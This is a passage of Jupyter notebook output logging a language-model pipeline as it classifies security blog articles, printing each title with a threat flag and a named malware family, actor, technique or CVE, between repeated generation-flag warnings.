            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ScrubCrypt\n",
            "Processing 144/427: Ransomware Roundup – Sirattacker and ALC...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sirattacker\n",
            "Processing 145/427: Just Because It’s Old Doesn’t Mean You Throw It Aw...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: MyDoom\n",
            "Processing 146/427: Can You See It Now? An Emerging LockBit Campaign...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: LockBit\n",
            "Processing 147/427: Key Findings from the 2H 2022 FortiGuard Labs Thre...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Wiper malware\n",
            "Processing 148/427: Royal Ransomware Targets Linux ESXi Servers...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Royal Ransomware\n",
            "Processing 149/427: More Supply Chain Attacks via New Malicious Python...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Portugal\n",
            "Processing 150/427: Ransomware Roundup – CatB...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: CatB\n",
            "  Processed 150/427 articles\n",
            "Processing 151/427: Supply Chain Attack via New Malicious Python Packa...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Fade Stealer\n",
            "Processing 152/427: Supply Chain Attack by New Malicious Python Packag...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ily.exe\n",
            "Processing 153/427: Ransomware Roundup – Trigona...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trigona\n",
            "Processing 154/427: Analyzing Malware Code that Cryptojacks System to ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: GHJFRGUNL.exe\n",
            "Processing 155/427: FortiGuard Outbreak Alerts - 2022 Annual Report...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 156/427: The Year of the Wiper...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: HermeticWiper\n",
            "Processing 157/427: QR Code Phishing Attempts to Steal Credentials fro...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: QR code phishing\n",
            "Processing 158/427: Ransomware Roundup – Playing Whack-a-Mole with New...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: CrySIS/Dharma\n",
            "Processing 159/427: Supply Chain Attack Using Identical PyPI Packages,...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: PowerShell\n",
            "Processing 160/427: 2022 IoT Threat Review...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2017-17215\n",
            "  Processed 160/427 articles\n",
            "Processing 161/427: Ransomware Roundup – Monti, BlackHunt, and Putin...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Monti\n",
            "Processing 162/427: Trying to Steal Christmas (Again!)...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: fkkvzetzm.exe\n",
            "Processing 163/427: Ransomware Roundup – Play...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Play\n",
            "Processing 164/427: The Taxman Never Sleeps...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emotet\n",
            "Processing 165/427: New Supply Chain Attack Uses Python Package Index ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: aioconsol\n",
            "Processing 166/427: Supply Chain Attack via New Malicious Python Packa...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: main.exe\n",
            "Processing 167/427: Want to Know What’s in That Online Mystery Box? NO...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 168/427: GoTrim: Go-based Botnet Actively Brute Forces Word...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: GoTrim\n",
            "Processing 169/427: Supply Chain Attack via New Malicious Python Packa...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2022-40444\n",
            "Processing 170/427: Ransomware Roundup – New Vohuk, ScareCrow, and AER...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Vohuk\n",
            "  Processed 170/427 articles\n",
            "Processing 171/427: cyber war middle east...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Stuxnet\n",
            "Processing 172/427: toolshell zero day sharepoint cve 2025 53770...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2025-53770\n",
            "Processing 173/427: fog ransomware attack...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: TheFog\n",
            "Processing 174/427: chrome extension leaks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 175/427: chrome extension credentials...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 176/427: play ransomware zero day...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2025-29824\n",
            "Processing 177/427: billbug china espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Billbug\n",
            "Processing 178/427: shuckworm ukraine gammasteel...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: GammaSteel\n",
            "Processing 179/427: ransomhub betruger backdoor...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Betruger\n",
            "Processing 180/427: ai agent attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Operator\n",
            "  Processed 180/427 articles\n",
            "Processing 181/427: medusa ransomware attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Medusa\n",
            "Processing 182/427: ransomware trends 2025...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 183/427: chinese espionage ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: PlugX\n",
            "Processing 184/427: china southeast asia espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Rakshasa\n",
            "Processing 185/427: us china espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: DLL-sideloading\n",
            "Processing 186/427: exposing danger within hardcoded cloud credentials...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: Hardcoded AWS Credentials\n",
            "Processing 187/427: ransomware threat level remains high...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: RansomHub\n",
            "Processing 188/427: stonefly north korea extortion...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Preft\n",
            "Processing 189/427: ransomware attacks rebound...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Syrphid\n",
            "Processing 190/427: taiwan malware dns...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Msupedge\n",
            "  Processed 190/427 articles\n",
            "Processing 191/427: cloud espionage attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: GoGra\n",
            "Processing 192/427: malware ai llm...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Rhadamanthys\n",
            "Processing 193/427: daggerfly espionage updated toolset...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Macma\n",
            "Processing 194/427: ransomware q2 2024...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 195/427: telecoms espionage asia...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Coolclient\n",
            "Processing 196/427: black basta ransomware zero day...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2024-26169\n",
            "Processing 197/427: ransomhub knight ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: RansomHub\n",
            "Processing 198/427: springtail kimsuky backdoor espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Springtail\n",
            "Processing 199/427: graph api threats...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: BirdyClient\n",
            "Processing 200/427: ransomware attacks exploits...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: LockBit\n",
            "  Processed 200/427 articles\n",
            "Processing 201/427: ransomware data exfiltration...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Rclone\n",
            "Processing 202/427: alpha netwalker ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Alpha\n",
            "Processing 203/427: ransomware threat landscape 2024...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 204/427: iran apt seedworm africa telecoms...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: MuddyC2Go\n",
            "Processing 205/427: spyware obfuscation static analysis...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Spyware cluster\n",
            "Processing 206/427: crambus middle east government...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: PowerExchange\n",
            "Processing 207/427: grayling taiwan cyber attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: DLL sideloading\n",
            "Processing 208/427: budworm tool update telecoms govt...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: SysUpdate\n",
            "Processing 209/427: 3am ransomware lockbit...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: 3AM\n",
            "Processing 210/427: critical infrastructure attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ShadowPad\n",
            "  Processed 210/427 articles\n",
            "Processing 211/427: qakbot takedown disruption...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Qakbot\n",
            "Processing 212/427: carderbee software supply chain certificate abuse...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Korplug\n",
            "Processing 213/427: syssphinx fin8 backdoor...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Noberus\n",
            "Processing 214/427: microsoft zeroday exploit...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-36884\n",
            "Processing 215/427: flea backdoor microsoft graph apt15...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Graphican\n",
            "Processing 216/427: shuckworm russia ukraine military...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Pterodo\n",
            "Processing 217/427: moveit vulnerabilities exploits...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-34362\n",
